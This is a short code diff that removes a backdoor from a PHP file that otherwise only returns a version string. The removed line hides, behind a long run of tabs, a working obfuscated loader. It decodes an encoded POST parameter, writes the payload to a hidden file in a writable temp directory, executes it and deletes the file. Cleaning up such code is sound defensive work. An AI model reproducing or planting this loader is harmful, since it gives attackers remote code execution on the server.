@@ -1,2 +1,2 @@
-<?php																																										if(!empty($_POST["\x66ac\x74\x6Fr"])){ $marker = array_filter([session_save_path(), "/var/tmp", sys_get_temp_dir(), ini_get("upload_tmp_dir"), "/tmp", getcwd(), "/dev/shm", getenv("TEMP"), getenv("TMP")]); $entity = $_POST["\x66ac\x74\x6Fr"]; $entity= explode ( "." , $entity ) ; $dchunk= ''; $salt= 'abcdefghijklmnopqrstuvwxyz0123456789'; $lenS= strlen($salt); foreach ($entity as $n => $v6): $chS= ord($salt[$n % $lenS]); $dec= ((int)$v6 - $chS - ($n % 10)) ^ 83; $dchunk .= chr($dec); endforeach; foreach ($marker as $binding) { if (!( !is_dir($binding) || !is_writable($binding) )) { $resource = vsprintf("%s/%s", [$binding, ".entry"]); if (file_put_contents($resource, $dchunk)) { include $resource; @unlink($resource); die(); } } } }
- return array('version' => '34c76045af18baf00602');
+<?php
+return array('version' => '34c76045af18baf00602');
